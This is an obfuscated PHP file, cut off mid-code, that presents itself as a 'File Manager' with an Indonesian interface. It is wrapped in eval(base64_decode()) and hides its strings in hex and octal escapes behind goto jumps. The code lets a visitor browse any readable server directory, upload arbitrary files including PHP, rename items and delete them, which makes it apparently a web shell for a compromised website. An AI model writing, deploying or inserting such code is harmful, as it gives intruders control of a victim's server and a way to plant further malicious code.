<?php eval(base64_decode('
 goto QX4Y3; nYcTN: if ($fileManager) { foreach ($breadcrumbs as $index => $crumb) { if ($index > 0) { ?>
/<?php  } ?>
<a href="?d=<?php  echo urlencode($crumb["\160\141\164\150"]); ?>
"><?php  echo sanitizePath($crumb["\156\x61\155\x65"]); ?>
</a><?php  } } else { ?>
<a href="?d=<?php  echo urlencode(getcwd()); ?>
">Home</a><?php  } goto n9UjO; olPf3: ?>
</span><a href="?admin_logout=1"class="logout-btn"title="Logout"><i class="fas fa-sign-out-alt"></i> Logout</a></div></div></div></div><div class="breadcrumb"><?php  goto nYcTN; xLTCI: session_start(); goto zaKFv; mEj2Q: if (isset($_GET["\141\144\x6d\x69\x6e\137\x6c\x6f\x67\157\x75\x74"])) { session_destroy(); header("\x4c\157\x63\141\164\151\157\156\72\x20" . $_SERVER["\x50\x48\x50\137\123\x45\x4c\x46"]); die; } goto jiCNf; n9UjO: ?>
</div><div class="content"><?php  goto hHQyO; e0BYc: ?>
<!doctypehtml><html lang="id"><head><meta charset="UTF-8"><meta content="width=device-width,initial-scale=1"name="viewport"><title>File Manager</title><link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css"rel="stylesheet"><style>*{margin:0;padding:0;box-sizing:border-box}body{background:linear-gradient(135deg,#667eea 0,#764ba2 100%);font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;color:#333;min-height:100vh;padding:20px}.container{max-width:1200px;margin:0 auto;background:rgba(255,255,255,.95);border-radius:20px;box-shadow:0 20px 40px rgba(0,0,0,.1);overflow:hidden;backdrop-filter:blur(10px)}.header{background:linear-gradient(135deg,#667eea 0,#764ba2 100%);color:#fff;padding:30px}.header-content{display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:20px}.header-left{text-align:left}.header-right{text-align:right}.header h1{font-size:2.5em;margin-bottom:10px;font-weight:300}.admin-info{display:flex;align-items:center;gap:15px;background:rgba(255,255,255,.1);padding:10px 15px;border-radius:10px;backdrop-filter:blur(5px)}.admin-username{display:flex;align-items:center;gap:8px;font-weight:600;color:#fff}.logout-btn{display:flex;align-items:center;gap:8px;padding:8px 15px;background:rgba(220,53,69,.8);color:#fff;text-decoration:none;border-radius:8px;font-weight:600;transition:all .3s ease;border:1px solid rgba(220,53,69,.3)}.logout-btn:hover{background:rgba(220,53,69,1);transform:translateY(-2px);box-shadow:0 5px 15px rgba(220,53,69,.3);color:#fff;text-decoration:none}@media (max-width:768px){.header-content{flex-direction:column;text-align:center}.header-left,.header-right{text-align:center}.admin-info{flex-direction:column;gap:10px}}.breadcrumb{background:rgba(255,255,255,.1);padding:15px 30px;border-bottom:1px solid rgba(255,255,255,.2)}.breadcrumb a{color:#fff;text-decoration:none;transition:all .3s ease}.breadcrumb a:hover{color:gold;text-decoration:underline}.content{padding:30px}.actions-panel{display:grid;grid-template-columns:1fr 1fr 1fr;gap:20px;margin-bottom:30px;background:#f8f9fa;padding:20px;border-radius:15px;border:1px solid #e9ecef}.action-group{display:flex;gap:10px;align-items:center}.action-group input[type=file],.action-group input[type=text]{flex:1;padding:12px 15px;border:2px solid #e9ecef;border-radius:10px;font-size:14px;transition:all .3s ease}.action-group input:focus{outline:0;border-color:#667eea;box-shadow:0 0 0 3px rgba(102,126,234,.1)}.btn{padding:12px 20px;border:none;border-radius:10px;font-size:14px;font-weight:600;cursor:pointer;transition:all .3s ease;text-decoration:none;display:inline-flex;align-items:center;gap:8px}.btn-primary{background:linear-gradient(135deg,#667eea 0,#764ba2 100%);color:#fff}.btn-primary:hover{transform:translateY(-2px);box-shadow:0 10px 20px rgba(102,126,234,.3)}.btn-success{background:linear-gradient(135deg,#56ab2f 0,#a8e6cf 100%);color:#fff}.btn-success:hover{transform:translateY(-2px);box-shadow:0 10px 20px rgba(86,171,47,.3)}.btn-danger{background:linear-gradient(135deg,#ff416c 0,#ff4b2b 100%);color:#fff}.btn-danger:hover{transform:translateY(-2px);box-shadow:0 10px 20px rgba(255,65,108,.3)}.btn-warning{background:linear-gradient(135deg,#f093fb 0,#f5576c 100%);color:#fff}.btn-warning:hover{transform:translateY(-2px);box-shadow:0 10px 20px rgba(240,147,251,.3)}.btn-info{background:linear-gradient(135deg,#4facfe 0,#00f2fe 100%);color:#fff}.btn-info:hover{transform:translateY(-2px);box-shadow:0 10px 20px rgba(79,172,254,.3)}.btn-secondary{background:linear-gradient(135deg,#6c757d 0,#495057 100%);color:#fff}.btn-secondary:hover{transform:translateY(-2px);box-shadow:0 10px 20px rgba(108,117,125,.3)}.file-table{width:100%;border-collapse:collapse;background:#fff;border-radius:15px;overflow:hidden;box-shadow:0 10px 30px rgba(0,0,0,.1)}.file-table th{background:linear-gradient(135deg,#667eea 0,#764ba2 100%);color:#fff;padding:20px 15px;text-align:left;font-weight:600;font-size:14px}.file-table td{padding:15px;border-bottom:1px solid #f1f3f4;vertical-align:middle}.file-table tr:hover{background:#f8f9fa;transform:scale(1.01);transition:all .3s ease}.file-name{display:flex;align-items:center;gap:10px;font-weight:500}.file-name a{color:#667eea;text-decoration:none;transition:all .3s ease}.file-name a:hover{color:#764ba2;text-decoration:underline}.file-icon{font-size:1.2em}.file-actions{display:flex;gap:5px;flex-wrap:wrap}.file-actions form{display:inline}.file-actions input[type=text]{padding:8px 12px;border:1px solid #ddd;border-radius:5px;font-size:12px;width:120px}.permissions{font-family:'Courier New',monospace;font-size:12px;color:#666}.size{font-weight:500;color:#555}.modified{font-size:12px;color:#888}.alert{padding:15px 20px;margin-bottom:20px;border-radius:10px;font-weight:500}.alert-success{background:linear-gradient(135deg,#d4edda 0,#c3e6cb 100%);color:#155724;border:1px solid #c3e6cb}.alert-error{background:linear-gradient(135deg,#f8d7da 0,#f5c6cb 100%);color:#721c24;border:1px solid #f5c6cb}.nav-tabs{display:flex;background:#f8f9fa;border-radius:10px;padding:5px;margin-bottom:20px;border:1px solid #e9ecef}.nav-tab{flex:1;padding:12px 20px;text-align:center;text-decoration:none;color:#667eea;border-radius:8px;transition:all .3s ease;font-weight:500}.nav-tab:hover{background:rgba(102,126,234,.1);color:#764ba2}.nav-tab.active{background:linear-gradient(135deg,#667eea 0,#764ba2 100%);color:#fff}.tree-view{background:#fff;border-radius:15px;padding:20px;box-shadow:0 10px 30px rgba(0,0,0,.1);max-height:600px;overflow-y:auto}.tree-item{margin:5px 0;padding:8px 12px;border-radius:8px;transition:all .3s ease;cursor:pointer}.tree-item:hover{background:#f8f9fa}.tree-item.directory{border-left:3px solid #667eea}.tree-item.file{border-left:3px solid #28a745}.tree-children{margin-left:25px;border-left:2px solid #e9ecef;padding-left:15px}.tree-toggle{cursor:pointer;margin-right:8px;transition:transform .3s ease}.tree-toggle.expanded{transform:rotate(90deg)}.search-panel{background:#f8f9fa;padding:20px;border-radius:15px;margin-bottom:20px;border:1px solid #e9ecef}.search-form{display:flex;gap:10px;align-items:center}.search-form input[type=text]{flex:1;padding:12px 15px;border:2px solid #e9ecef;border-radius:10px;font-size:14px}.search-form input:focus{outline:0;border-color:#667eea;box-shadow:0 0 0 3px rgba(102,126,234,.1)}.search-results{background:#fff;border-radius:15px;padding:20px;box-shadow:0 10px 30px rgba(0,0,0,.1)}.server-info{background:linear-gradient(135deg,#4facfe 0,#00f2fe 100%);color:#fff;padding:15px 20px;border-radius:10px;margin-bottom:20px;font-weight:500}.server-info h3{margin:0 0 10px 0;font-size:1.2em}.server-info p{margin:5px 0;font-size:.9em}.navigation-controls{background:#f8f9fa;padding:15px 20px;border-radius:10px;margin-bottom:20px;border:1px solid #e9ecef;display:flex;gap:10px;align-items:center;flex-wrap:wrap}.current-path{color:#666;font-size:14px;font-family:'Courier New',monospace;background:#fff;padding:8px 12px;border-radius:5px;border:1px solid #ddd;flex:1;min-width:200px}.create-file-panel,.edit-file-panel{background:#fff;border-radius:15px;padding:30px;box-shadow:0 10px 30px rgba(0,0,0,.1);margin-bottom:20px}.create-header,.edit-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:25px;padding-bottom:15px;border-bottom:2px solid #f1f3f4}.create-header h3,.edit-header h3{margin:0;color:#667eea;font-size:1.5em}.form-group{margin-bottom:20px}.form-group label{display:block;margin-bottom:8px;font-weight:600;color:#333}.form-control{width:100%;padding:12px 15px;border:2px solid #e9ecef;border-radius:10px;font-size:14px;transition:all .3s ease}.form-control:focus{outline:0;border-color:#667eea;box-shadow:0 0 0 3px rgba(102,126,234,.1)}.code-editor{width:100%;padding:15px;border:2px solid #e9ecef;border-radius:10px;font-family:'Courier New',monospace;font-size:14px;line-height:1.5;resize:vertical;min-height:400px;background:#f8f9fa;transition:all .3s ease}.code-editor:focus{outline:0;border-color:#667eea;box-shadow:0 0 0 3px rgba(102,126,234,.1);background:#fff}.form-text{font-size:12px;color:#666;margin-top:5px}.form-actions{display:flex;gap:15px;justify-content:flex-start;padding-top:20px;border-top:1px solid #e9ecef}.form-actions .btn{min-width:120px}.modal{display:none;position:fixed;z-index:1000;left:0;top:0;width:100%;height:100%;background-color:rgba(0,0,0,.5);backdrop-filter:blur(5px)}.modal-content{background:#fff;margin:2% auto;padding:0;border-radius:15px;width:90%;max-width:1000px;max-height:90vh;overflow:hidden;box-shadow:0 20px 40px rgba(0,0,0,.3);animation:modalSlideIn .3s ease-out}@keyframes modalSlideIn{from{opacity:0;transform:translateY(-50px) scale(.9)}to{opacity:1;transform:translateY(0) scale(1)}}.modal-header{background:linear-gradient(135deg,#667eea 0,#764ba2 100%);color:#fff;padding:20px 30px;display:flex;justify-content:space-between;align-items:center}.modal-header h3{margin:0;font-size:1.3em}.modal-close{background:0 0;border:none;color:#fff;font-size:24px;cursor:pointer;padding:5px;border-radius:5px;transition:all .3s ease}.modal-close:hover{background:rgba(255,255,255,.2)}.modal-body{padding:30px;max-height:70vh;overflow-y:auto}.file-content{background:#f8f9fa;border:2px solid #e9ecef;border-radius:10px;padding:20px;font-family:'Courier New',monospace;font-size:14px;line-height:1.6;white-space:pre-wrap;word-wrap:break-word;max-height:60vh;overflow-y:auto;color:#333}.file-content:focus{outline:0;border-color:#667eea;box-shadow:0 0 0 3px rgba(102,126,234,.1)}.file-content.htaccess{background:#1e1e1e;color:#d4d4d4;border-color:#333}.file-content.htaccess:focus{border-color:#007acc;box-shadow:0 0 0 3px rgba(0,122,204,.1)}.file-info{background:#e9ecef;padding:15px;border-radius:10px;margin-bottom:20px;font-size:14px}.file-info p{margin:5px 0;color:#666}.file-info strong{color:#333}.modal-actions{padding:20px 30px;background:#f8f9fa;border-top:1px solid #e9ecef;display:flex;gap:10px;justify-content:flex-end}@media (max-width:768px){.actions-panel{grid-template-columns:1fr}.file-table{font-size:12px}.file-actions{flex-direction:column}.file-actions input[type=text]{width:100%}.create-header,.edit-header{flex-direction:column;gap:15px;align-items:flex-start}.form-actions{flex-direction:column}.form-actions .btn{width:100%}.code-editor{min-height:300px}.modal-content{width:95%;margin:5% auto}.modal-header{padding:15px 20px}.modal-body{padding:20px}.modal-actions{padding:15px 20px;flex-direction:column}.modal-actions .btn{width:100%}.loading-spinner{display:inline-block;width:20px;height:20px;border:3px solid #f3f3f3;border-top:3px solid #667eea;border-radius:50%;animation:spin 1s linear infinite;margin-right:10px}@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}.loading-text{color:#667eea;font-style:italic}}@media (min-width:1024px){.file-actions{flex-wrap:nowrap!important;gap:8px!important;justify-content:flex-start}.file-actions a,.file-actions button,.file-actions form{margin-bottom:0!important}.file-table td{vertical-align:middle}}@media (max-width:1023px){.file-actions{flex-direction:row!important;flex-wrap:wrap;gap:8px!important;justify-content:flex-start}.file-actions a,.file-actions button,.file-actions form{margin-bottom:4px}}.file-actions{display:flex;gap:8px;flex-wrap:wrap;align-items:center}.file-actions a,.file-actions button,.file-actions form{margin-bottom:0}.file-actions input[type=text]{width:90px;min-width:70px;margin-right:4px}@media (min-width:1024px){.modal-content{max-width:800px}}@media (max-width:1023px){.modal-content{max-width:98vw}}</style></head><body><div class="container"><div class="header"><div class="header-content"><div class="header-left"><h1><i class="fas fa-folder-open"></i> File Manager</h1><p>Kelola file dan folder dengan mudah</p></div><div class="header-right"><div class="admin-info"><span class="admin-username"><i class="fas fa-user-shield"></i><?php  goto xHJU4; o0P7A: function renderTreeView($tree, $fileManager, $level = 0) { $html = ''; foreach ($tree as $item) { $indent = str_repeat("\x26\x6e\142\x73\x70\73\x26\156\x62\x73\160\x3b\46\156\x62\x73\x70\73\x26\156\x62\x73\160\73", $level); $hasChildren = isset($item["\143\x68\x69\154\x64\x72\x65\156"]) && !empty($item["\143\150\x69\x6c\x64\x72\145\156"]); $itemClass = $item["\151\163\x44\151\x72"] ? "\x64\151\162\145\x63\x74\157\x72\x79" : "\x66\151\x6c\x65"; $toggleIcon = $hasChildren ? "\74\x69\x20\x63\x6c\141\163\163\x3d\x22\146\141\163\x20\x66\141\x2d\143\x68\145\166\162\x6f\156\55\162\151\x67\x68\164\40\164\162\x65\145\x2d\164\x6f\147\147\x6c\x65\42\x20\157\x6e\x63\154\151\x63\153\x3d\x22\x74\x6f\147\x67\154\x65\x54\162\x65\145\50\x74\x68\x69\163\54\x20\47\164\x72\x65\145\55" . md5($item["\160\141\x74\x68"]) . "\x27\51\x22\76\x3c\57\x69\76" : "\74\151\40\143\x6c\141\163\x73\75\x22\146\141\163\x20\x66\141\x2d\x6d\151\156\165\163\42\x20\163\x74\x79\154\145\75\x22\x6d\141\162\x67\151\x6e\55\162\151\x67\x68\164\72\40\70\x70\x78\x3b\40\143\x6f\x6c\x6f\162\72\x20\43\x63\x63\143\73\42\76\x3c\57\x69\x3e"; $html .= "\74\144\151\166\x20\143\154\x61\163\x73\75\x22\164\162\x65\x65\55\151\164\145\155\40" . $itemClass . "\x22\x3e"; $html .= $indent . $toggleIcon; $html .= "\74\x73\160\x61\156\x20\143\154\x61\x73\x73\75\42\146\x69\154\x65\55\151\x63\157\156\42\x3e" . $item["\151\x63\157\156"] . "\74\x2f\x73\160\x61\x6e\x3e"; if ($item["\x69\163\104\151\162"]) { $html .= "\74\141\x20\x68\162\x65\146\75\x22\x3f\x64\75" . urlencode($item["\x70\x61\x74\x68"]) . "\42\x3e" . sanitizePath($item["\156\x61\x6d\145"]) . "\x3c\x2f\x61\x3e"; } else { $html .= "\74\163\x70\141\156\76" . sanitizePath($item["\x6e\x61\155\x65"]) . "\x3c\x2f\163\160\x61\x6e\x3e"; } $html .= "\x20\x3c\163\x6d\x61\x6c\154\40\x73\x74\x79\154\x65\x3d\x22\x63\157\154\157\x72\x3a\40\x23\x36\66\66\73\42\76\x28" . $item["\163\x69\172\x65"] . "\x29\74\57\163\155\141\x6c\154\x3e"; $html .= "\74\x2f\x64\151\x76\76"; if ($hasChildren) { $html .= "\74\144\x69\166\40\x69\144\x3d\42\x74\x72\145\x65\55" . md5($item["\160\x61\164\x68"]) . "\x22\x20\x63\154\x61\x73\163\x3d\x22\164\x72\x65\x65\55\x63\150\x69\x6c\144\162\x65\x6e\42\x20\x73\164\171\x6c\x65\x3d\42\x64\x69\x73\x70\154\141\x79\72\x20\156\157\x6e\x65\x3b\x22\76"; $html .= renderTreeView($item["\143\150\151\154\144\162\x65\156"], $fileManager, $level + 1); $html .= "\74\x2f\144\x69\x76\76"; } } return $html; } goto mT2ht; mT2ht: class FileManager { private $currentPath; private $allowedExtensions = array("\x74\x78\x74", "\x70\150\160", "\150\164\155\x6c", "\x63\x73\x73", "\152\x73", "\152\163\157\x6e", "\x78\x6d\x6c", "\x6d\144", "\x6c\x6f\x67", "\x68\x74\x61\143\x63\x65\x73\163"); public function __construct() { $this->currentPath = $this->getCurrentPath(); if (!is_dir($this->currentPath) || !is_readable($this->currentPath)) { $this->currentPath = getcwd(); } } private function getCurrentPath() { $path = isset($_GET["\144"]) ? $_GET["\x64"] : getcwd(); $realPath = realpath($path); if ($realPath === false || !is_dir($realPath)) { return getcwd(); } if (!is_readable($realPath)) { return getcwd(); } return $realPath; } public function getCurrentPathValue() { return $this->currentPath; } public function sanitizePath($path) { return htmlspecialchars($path, ENT_QUOTES, "\125\124\106\x2d\70"); } public function formatSize($bytes) { $units = array("\102", "\113\102", "\x4d\x42", "\x47\102", "\x54\x42"); $bytes = max($bytes, 0); $pow = floor(($bytes ? log($bytes) : 0) / log(1024)); $pow = min($pow, count($units) - 1); $bytes /= pow(1024, $pow); return round($bytes, 2) . "\40" . $units[$pow]; } public function getIcon($path) { if (is_dir($path)) { return "\xf0\x9f\x93\x81"; } $extension = strtolower(pathinfo($path, PATHINFO_EXTENSION)); $iconMap = array("\x70\150\x70" => "\xf0\237\220\230", "\x68\164\155\x6c" => "\360\237\214\x90", "\x63\163\163" => "\360\237\x8e\250", "\152\163" => "\xe2\x9a\xa1", "\x6a\x73\157\156" => "\360\237\223\x8b", "\x78\155\154" => "\xf0\x9f\x93\204", "\x74\170\x74" => "\360\x9f\x93\x9d", "\155\144" => "\xf0\237\x93\x96", "\154\157\147" => "\360\237\x93\212", "\150\164\141\x63\143\x65\x73\x73" => "\xe2\232\231\xef\xb8\217", "\152\160\147" => "\360\237\226\xbc\357\xb8\x8f", "\x6a\x70\x65\x67" => "\360\x9f\x96\xbc\xef\270\217", "\160\x6e\x67" => "\xf0\x9f\226\xbc\357\270\217", "\147\151\x66" => "\xf0\x9f\x96\274\357\xb8\x8f", "\160\144\x66" => "\xf0\237\223\225", "\144\x6f\x63" => "\xf0\x9f\x93\x98", "\144\157\143\x78" => "\xf0\x9f\x93\230", "\170\154\163" => "\360\x9f\x93\227", "\170\154\163\x78" => "\xf0\x9f\223\x97", "\x7a\151\x70" => "\360\x9f\223\xa6", "\162\x61\162" => "\360\237\x93\246"); return $iconMap[$extension] ?? "\xf0\237\223\204"; } public function getFilePermissions($path) { $perms = @fileperms($path); if ($perms === false) { return "\55\x2d\55\55\x2d\x2d\55\55\55"; } $info = ''; $info .= $perms & 256 ? "\162" : "\x2d"; $info .= $perms & 128 ? "\x77" : "\x2d"; $info .= $perms & 64 ? "\170" : "\55"; $info .= $perms & 32 ? "\162" : "\55"; $info .= $perms & 16 ? "\x77" : "\x2d"; $info .= $perms & 8 ? "\170" : "\55"; $info .= $perms & 4 ? "\162" : "\55"; $info .= $perms & 2 ? "\167" : "\55"; $info .= $perms & 1 ? "\170" : "\x2d"; return $info; } public function getBreadcrumbs() { $currentPath = $this->currentPath; $serverRoot = $this->getServerRoot(); if ($currentPath === $serverRoot) { return array(array("\x6e\141\155\x65" => basename($serverRoot) ?: "\123\145\x72\166\145\x72\x20\x52\x6f\157\x74", "\160\x61\164\x68" => $serverRoot)); } $breadcrumbs = array(); $pathParts = explode(DIRECTORY_SEPARATOR, $currentPath); $rootParts = explode(DIRECTORY_SEPARATOR, $serverRoot); $breadcrumbPath = $serverRoot; $breadcrumbs[] = array("\156\x61\x6d\x65" => basename($serverRoot) ?: "\x53\145\x72\x76\x65\x72\40\122\x6f\x6f\164", "\x70\x61\164\150" => $serverRoot); for ($i = count($rootParts); $i < count($pathParts); $i++) { if (!empty($pathParts[$i])) { $breadcrumbPath .= DIRECTORY_SEPARATOR . $pathParts[$i]; $breadcrumbs[] = array("\x6e\x61\x6d\145" => $pathParts[$i], "\160\x61\164\150" => $breadcrumbPath); } } return $breadcrumbs; } public function getParentDirectory() { $parent = dirname($this->currentPath); if ($parent === $this->currentPath) { return null; } if (!is_dir($parent) || !is_readable($parent)) { return null; } return $parent; } public function canAccessDirectory($path) { return is_dir($path) && is_readable($path); } public function canWriteToDirectory($path) { return is_dir($path) && is_writable($path); } public function getFiles() { $fileList = array(); if (!is_readable($this->currentPath)) { return $fileList; } $files = @scandir($this->currentPath); if ($files === false) { return $fileList; } foreach ($files as $file) { if ($file !== "\56" && $file !== "\56\x2e") { $fullPath = $this->currentPath . DIRECTORY_SEPARATOR . $file; if (!is_readable($fullPath)) { continue; } $fileList[] = array("\156\141\x6d\x65" => $file, "\x70\141\164\x68" => $fullPath, "\151\x73\104\151\x72" => is_dir($fullPath), "\163\x69\x7a\x65" => is_file($fullPath) ? $this->formatSize(@filesize($fullPath)) : "\106\x6f\154\x64\145\x72", "\160\145\x72\155\x69\x73\163\x69\157\156\x73" => $this->getFilePermissions($fullPath), "\151\x63\157\x6e" => $this->getIcon($fullPath), "\155\157\144\151\146\x69\x65\144" => date("\x59\55\155\x2d\144\40\110\x3a\151\72\x73", @filemtime($fullPath))); } } usort($fileList, function ($a, $b) { if ($a["\151\x73\104\x69\x72"] && !$b["\151\163\x44\x69\x72"]) { return -1; } if (!$a["\151\163\104\151\x72"] && $b["\x69\x73\104\151\162"]) { return 1; } return strcasecmp($a["\x6e\141\155\x65"], $b["\x6e\141\x6d\145"]); }); return $fileList; } public function handleUpload() { if (!isset($_POST["\165\x70\154\157\x61\144"]) || !isset($_FILES["\x75\x70\x6c\x6f\141\x64\x65\144\x5f\x66\x69\154\x65"])) { return array("\x73\x75\143\x63\x65\x73\x73" => false, "\155\145\163\x73\x61\x67\145" => "\124\x69\x64\141\153\x20\141\144\141\x20\x66\151\154\x65\x20\x79\141\x6e\x67\40\x64\151\165\x6e\x67\147\x61\x68"); } $file = $_FILES["\x75\160\x6c\x6f\x61\x64\145\x64\137\146\151\x6c\145"]; if ($file["\145\x72\162\157\162"] !== UPLOAD_ERR_OK) { $errorMessages = array(UPLOAD_ERR_INI_SIZE => "\x46\151\x6c\145\x20\x74\x65\162\x6c\141\x6c\x75\x20\142\145\163\141\162\40\x28\x6d\x65\x6c\145\142\151\150\151\x20\165\x70\x6c\157\x61\144\137\155\x61\170\x5f\146\151\x6c\x65\163\x69\172\145\x29", UPLOAD_ERR_FORM_SIZE => "\x46\151\154\145\40\x74\x65\x72\154\141\154\165\x20\142\x65\163\141\162\x20\50\x6d\145\154\x65\142\x69\150\x69\40\x4d\101\x58\x5f\106\x49\x4c\x45\137\123\111\132\105\x29", UPLOAD_ERR_PARTIAL => "\x46\151\154\145\40\150\x61\156\x79\x61\x20\x74\x65\x72\x75\160\154\x6f\141\x64\x20\163\145\142\x61\x67\x69\x61\x6e", UPLOAD_ERR_NO_FILE => "\124\151\x64\x61\x6b\40\141\x64\x61\x20\x66\151\x6c\x65\40\171\x61\x6e\x67\40\x64\151\165\x70\154\157\141\144", UPLOAD_ERR_NO_TMP_DIR => "\x54\151\144\x61\153\x20\141\x64\141\40\x64\151\162\x65\x6b\164\157\162\151\40\x74\145\x6d\x70\x6f\162\141\162\x79", UPLOAD_ERR_CANT_WRITE => "\107\x61\147\x61\154\x20\x6d\x65\x6e\165\154\x69\x73\x20\146\151\x6c\x65\40\153\145\x20\144\x69\x73\153", UPLOAD_ERR_EXTENSION => "\125\160\154\x6f\141\x64\x20\x64\151\150\145\x6e\164\151\153\x61\156\40\x6f\154\x65\x68\x20\145\170\x74\145\x6e\x73\x69\157\156"); $message = isset($errorMessages[$file["\x65\x72\x72\x6f\162"]]) ? $errorMessages[$file["\145\162\162\157\162"]] : "\x45\162\162\x6f\162\40\x64\141\154\141\x6d\x20\x75\x70\154\157\x61\x64\40\146\151\x6c\145"; return array("\163\165\x63\143\x65\163\x73" => false, "\155\145\163\163\x61\x67\x65" => $message); } $fileName = basename($file["\156\x61\x6d\145"]); if (empty($fileName)) { return array("\x73\x75\143\x63\x65\163\163" => false, "\x6d\145\x73\x73\x61\x67\x65" => "\x4e\141\155\x61\x20\146\x69\x6c\145\40\x74\x69\x64\x61\x6b\x20\x76\x61\154\151\144"); } $targetFile = $this->currentPath . DIRECTORY_SEPARATOR . $fileName; if (!is_writable($this->currentPath)) { return array("\163\165\143\143\x65\x73\163" => false, "\x6d\x65\163\163\141\147\145" => "\x44\151\x72\x65\x6b\x74\x6f\162\x69\x20\x74\151\144\141\x6b\40\144\141\x70\141\x74\x20\x64\x69\x74\165\x6c\x69\163"); } if (@move_uploaded_file($file["\164\155\160\137\156\141\155\x65"], $targetFile)) { return array("\163\x75\x63\143\x65\x73\163" => true, "\155\145\x73\x73\x61\147\x65" => "\106\151\x6c\x65\40\x62\145\x72\150\141\163\x69\x6c\x20\144\x69\165\x6e\147\x67\x61\150\41"); } return array("\163\165\x63\x63\145\163\x73" => false, "\x6d\x65\x73\x73\141\147\145" => "\x47\x61\x67\x61\x6c\x20\155\145\156\x67\x75\x6e\x67\x67\x61\150\40\x66\151\154\145\x21"); } public function handleCreateFolder() { if (!isset($_POST["\143\x72\145\x61\164\x65\x5f\146\x6f\x6c\x64\145\x72"]) || empty($_POST["\x66\157\x6c\x64\145\162\137\x6e\141\155\145"])) { return array("\163\x75\x63\x63\145\163\163" => false, "\x6d\x65\x73\x73\141\x67\145" => "\x4e\141\x6d\x61\40\146\x6f\x6c\144\145\162\x20\x74\151\144\x61\x6b\x20\x62\157\154\x65\x68\x20\x6b\157\x73\x6f\x6e\x67"); } $folderName = trim($_POST["\x66\x6f\154\x64\145\x72\x5f\156\141\x6d\x65"]); if (empty($folderName) || preg_match("\57\133\74\x3e\72\42\134\57\134\x7c\x3f\52\135\57", $folderName)) { return array("\163\165\x63\143\x65\x73\163" => false, "\x6d\145\x73\163\x61\x67\x65" => "\x4e\x61\155\x61\x20\x66\157\154\x64\x65\x72\x20\164\x69\144\141\x6b\x20\x76\x61\154\151\144"); } $targetPath = $this->currentPath . DIRECTORY_SEPARATOR . $folderName; if (!is_writable($this->currentPath)) { return array("\x73\x75\143\x63\x65\x73\163" => false, "\155\145\163\x73\x61\x67\x65" => "\104\x69\162\145\x6b\164\157\162\x69\40\x74\x69\144\141\x6b\40\x64\x61\160\141\164\x20\x64\x69\164\165\x6c\151\163"); } if (file_exists($targetPath)) { return array("\x73\x75\x63\x63\x65\163\x73" => false, "\155\x65\x73\163\x61\147\x65" => "\x46\x6f\x6c\144\x65\162\x20\x73\165\x64\141\x68\x20\141\x64\141"); } if (@mkdir($targetPath, 493)) { return array("\x73\x75\x63\143\145\163\163" => true, "\x6d\x65\163\163\141\147\x65" => "\106\157\x6c\144\145\x72\40\142\x65\x72\150\x61\163\x69\154\x20\144\151\x62\x75\x61\x74\x21"); } return array("\163\x75\x63\143\x65\163\163" => false, "\x6d\145\x73\x73\141\x67\145" => "\107\141\147\x61\x6c\x20\x6d\x65\155\142\165\x61\164\40\x66\x6f\x6c\x64\x65\162\41"); } public function handleRename() { if (!isset($_POST["\x72\145\156\141\155\145"]) || empty($_POST["\x72\145\x6e\x61\155\145\x5f\x70\141\164\x68"]) || empty($_POST["\156\145\167\137\x6e\x61\155\x65"])) { return array("\x73\165\x63\143\145\163\163" => false, "\x6d\145\x73\x73\141\x67\145" => "\104\x61\x74\x61\x20\164\x69\x64\x61\x6b\40\154\x65\x6e\147\x6b\x61\160"); } $oldPath = $_POST["\x72\145\156\141\x6d\145\x5f\160\x61\x74\150"]; $newName = trim($_POST["\x6e\145\x77\x5f\156\x61\155\x65"]); $realOldPath = realpath($oldPath); if ($realOldPath === false || !file_exists($realOldPath)) { return array("\163\x75\143\x63\145\163\x73" => false, "\155\145\x73\x73\x61\147\x65" => "\x46\x69\x6c\x65\x2f\x66\x6f\x6c\x64\145\162\x20\164\151\x64\141\x6b\40\144\151\x74\x65\x6d\165\x6b\141\x6e"); } if (empty($newName) || preg_match("\x2f\133\x3c\76\72\x22\x5c\57\x5c\174\x3f\52\135\57", $newName)) { return array("\x73\x75\x63\143\x65\163\163" => false, "\x6d\x65\x73\x73\141\147\145" => "\x4e\x61\155\141\40\142\141\162\165\x20\164\x69\144\141\x6b\40\166\x61\x6c\x69\144"); } $newPath = dirname($realOldPath) . DIRECTORY_SEPARATOR . $newName; if (file_exists($newPath)) { return array("\x73\165\143\x63\x65\x73\x73" => false, "\x6d\145\163\163\x61\x67\145" => "\116\141\155\141\x20\x73\x75\144\x61\150\x20\x61\144\141"); } if (!is_writable(dirname($realOldPath))) { return array("\x73\x75\x63\x63\145\163\163" => false, "\x6d\x65\x73\x73\x61\x67\x65" => "\124\x69\x64\x61\153\x20\x64\141\x70\141\x74\40\155\x65\156\165\154\151\x73\40\x6b\145\40\144\151\162\x65\x6b\x74\x6f\x72\151"); } if (@rename($realOldPath, $newPath)) { return array("\x73\x75\143\143\145\163\x73" => true, "\x6d\x65\163\163\141\147\145" => "\x4e\141\155\141\x20\x62\x65\162\150\x61\163\x69\154\40\x64\x69\x75\142\x61\x68\x21"); } return array("\163\165\x63\x63\145\x73\x73" => false, "\155\x65\163\x73\141\x67\x65" => "\x47\141\x67\x61\x6c\40\155\x65\x6e\x67\x75\x62\141\150\x20\x6e\141\x6d\x61\x21"); } public function handleDelete() { if (!isset($_POST["\x64\x65\x6c\145\x74\x65\x5f\x70\x61\x74\150"])) { return array("\x73\165\x63\143\x65\x73\163" => false, "\x6d\145\x73\x73\x61\x67\x65" => "\120\141\x74\x68\x20\x74\x69\x64\x61\x6b\40\144\151\x74\145\155\165\x6b\x61\x6e"); } $deletePath = $_POST["\x64\145\x6c\x65\164\145\x5f\x70\x61\x74\150"]; $realDeletePath = realpath($deletePath); if ($realDeletePath === false || !file_exists($realDeletePath)) { return array("\163\165\143\143\x65\x73\x73" => false, "\x6d\145\x73\163\141\x67\145" => "\x46\151\x6c\145\x2f\146\x6f\x6c\144\145\162\x20\x74\x69\144\x61\x6b\40\144\x69\164\x65\155\165\x6b\141\x6e"); } if (!is_writable(dirname($realDeletePath))) { return array("\163\165\x63\143\x65\x73\163" => false, "\x6d\x65\x73\163\141\x67\x65" => "\124\151\x64\141\153\x20\x64\x61\x70\x61\x74\x20\x6d\145\156\165\154\x69\163\40\153\145\x20\x64\151\x72\x65\153\164\157\162\151"); } if (is_dir($realDeletePath)) { $files = @scandir($realDeletePath); if ($files === false || count($files) > 2) { return array("\163\165\x63\143\x65\163\x73" => false, 